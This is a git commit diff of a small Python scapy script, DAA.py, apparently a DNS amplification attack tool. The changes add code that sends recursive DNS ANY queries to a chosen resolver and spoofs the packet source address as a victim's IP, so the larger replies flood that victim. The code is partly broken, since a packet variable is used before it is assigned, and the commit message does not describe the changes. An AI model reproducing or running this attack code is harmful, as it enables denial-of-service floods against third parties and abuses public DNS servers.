6c65c38f4e8d71ada8379c24183f6c7372211fde
ztex <ztex030640417@gmail.com>
2019-03-21 13:33:28 +0800

    Fix Add sudo to fix BPF handles

--- DAA.py
+++ DAA.py
@@ -3,9 +3,10 @@ from scapy.all import *
 from argparse import ArgumentParser
 import sys
 
-def construct_IP():
+def construct_IP(DNSaddr):
     # Construct IP packet
     ip = IP()
+    ip.dst = DNSaddr
     ip.show()
     return ip
 
@@ -18,16 +19,20 @@ def construct_UDP():
 def construct_DNS():
     # Construct DNS packet
     dns = DNS()
+    dns.rd = 1
+    dns.qdcount = 1
     dns.display()
     return dns
 
-def construct_DNSQR():
+def construct_DNSQR(qtype=255, qname = 'qq.com'):
     # Construct DNS Question Record
     q = DNSQR()
+    q.qtype = qtype
+    q.qname = qname
     q.display()
     return q
 
-def Set_UP(ip, udp, dns, q):
+def Set_UP(ip, udp, dns, q, target = '127.0.0.1'):
     # Set DNS Question Record in DNS packet
     dns.qd = q
 
@@ -37,7 +42,7 @@ def Set_UP(ip, udp, dns, q):
     sr1(r)
 
     # Set up r
-    r.src = ''
+    r.src = target
     r = (ip/udp/dns)
     r.display()
     return r
@@ -50,7 +55,9 @@ if __name__ == '__main__':
     print('DNS server: %s' %args.D)
     print('Target: %s' %args.T)
 
-    ip = construct_IP()
+    ip = construct_IP(DNSaddr = args.D)
     udp = construct_UDP()
     dns = construct_DNS()
     q = construct_DNSQR()
+
+    r = Set_UP(ip, udp, dns, q, args.T)
